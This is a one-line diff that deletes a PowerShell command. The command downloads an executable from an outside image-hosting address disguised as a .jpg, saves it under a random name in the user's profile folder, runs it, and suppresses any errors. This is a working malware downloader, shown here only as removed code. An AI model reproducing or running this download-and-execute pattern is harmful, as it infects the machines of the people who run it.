@@ -1,1 +1,0 @@
-try{(New-Object System.Net.WebClient).DownloadFile('http://i.cubeupload.com/LOJbbc.jpg',$env:USERPROFILE+'\YsKaLppJZ.exe');(New-Object -com Shell.Application).ShellExecute($env:USERPROFILE+'\YsKaLppJZ.exe');}catch {}
